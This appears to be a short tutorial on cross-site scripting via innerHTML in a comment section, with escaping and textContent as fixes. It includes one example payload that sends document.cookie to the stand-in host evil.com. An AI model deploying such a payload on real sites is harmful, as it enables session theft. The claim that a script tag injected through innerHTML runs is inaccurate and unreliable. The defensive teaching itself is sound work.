# Dangers of XSS (Cross-Site Scripting)
If your JavaScript manipulates your DOM content using .innerHTML based on user-input there's a big risk of getting exploited by Cross-Site Scripting.

Let's say our website had a comment section and users on the site could post their own comments.
```javascript
function renderComment(comment) {
    document.getElementById("comments").innerHTML += comment;
}
```

This works fine for people posting normal comments like "Nice website", "Gustavo is so Cool" and so on.
But imagine if someone posted this
```javascript
Great article! <script>
  fetch("https://evil.com/steal?cookie=" + document.cookie)
</script>
```
then our function would inject that script directly into our website which results in all of our users getting their cookies stolen.

## How to prevent XSS

To prevent Cross-Site Scripting it's very important that we sanitize all user-inputs before injecting them into our DOM.

This can be done by writing your own function that removes all characters that are not allowed
```javascript
function sanitizeXSS(string) {
            return string
                .replaceAll('&', '&amp;')
                .replaceAll('<', '&lt;')
                .replaceAll('>', '&gt;')
                .replaceAll('"', '&quot;')
                .replaceAll("'", '&#39;')
                .replaceAll('`', '&#x60;')
                .replaceAll('/', '&#x2F;');
        };
```

Or even safer just use the html elements textContent instead of innerHTML when dealing with user input - or maybe do both!
```javascript
element.textContent = userInput;
```
